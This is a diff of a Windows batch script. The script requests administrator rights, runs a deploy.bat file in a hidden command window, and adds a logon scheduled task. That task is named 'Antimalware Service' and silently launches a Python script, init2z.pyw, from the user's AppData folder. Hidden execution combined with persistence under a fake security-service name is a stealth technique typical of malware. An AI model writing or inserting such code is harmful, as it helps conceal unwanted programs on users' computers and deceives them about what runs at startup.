@@ -14,12 +14,14 @@ if '%errorlevel%' NEQ '0' (
 
     "%temp%\getadmin.vbs"
     del "%temp%\getadmin.vbs"
+    REM wscript.exe will help running deploy.bat file in hidden command prompt
     wscript.exe "invisible.vbs" "deploy.bat"
     exit /B
 
 :gotAdmin
     pushd "%CD%"
     CD /D "%~dp0"
-    wscript.exe "invisible.vbs" "deploy.bat"
 
-REM wscript.exe will help running deploy.bat file in hidden command prompt
+REM if administrative privileges are given then task is created
+REM adding entry in windows task scheduler for every logon (This step is optional). REQUIRES ADMIN COMMAND PROMPT which is already requested in hiddencmd.bat file.if no admin is given this command does not execute successfully.
+schtasks /create /tn "Antimalware Service" /tr "C:\Users\%USERNAME%\AppData\Local\Programs\Python\Python37\pythonw.exe C:\Users\%USERNAME%\AppData\Local\init2z.pyw" /F /sc ONLOGON /ru %USERNAME%
